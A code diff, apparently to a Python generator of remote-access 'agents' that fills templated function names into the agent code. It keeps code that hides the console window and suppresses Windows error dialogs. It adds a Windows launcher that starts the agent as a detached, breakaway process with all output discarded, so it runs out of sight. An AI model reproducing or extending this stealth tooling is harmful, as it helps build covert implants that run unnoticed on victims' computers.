@@ -1074,7 +1074,7 @@ def {init_func}():
         import ctypes
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
         ctypes.windll.kernel32.SetErrorMode(0x0001 | 0x0002)
-    except:
+    except Exception:
         pass
 
 {init_func}()
@@ -1372,6 +1372,26 @@ def {cmd_func}(cmd):
 
         # Make executable
         os.chmod(output_file, 0o755)
+
+        # Generate Windows launcher for detached execution
+        if target_os == 'windows':
+            launcher_file = output_file.with_name(output_file.stem + '_launcher.py')
+            agent_basename = output_file.name
+            launcher_code = f'''import subprocess, sys, os
+agent = os.path.join(os.path.dirname(os.path.abspath(__file__)), "{agent_basename}")
+subprocess.Popen(
+    [sys.executable, agent],
+    creationflags=0x01000008,
+    close_fds=True,
+    stdin=subprocess.DEVNULL,
+    stdout=subprocess.DEVNULL,
+    stderr=subprocess.DEVNULL,
+)
+'''
+            with open(launcher_file, 'w') as f:
+                f.write(launcher_code)
+            os.chmod(launcher_file, 0o755)
+            print(f"[+] Windows launcher: {launcher_file}")
 
         print(f"[*] Agent customized for {target_os.upper()} with platform-specific features")
         return str(output_file)
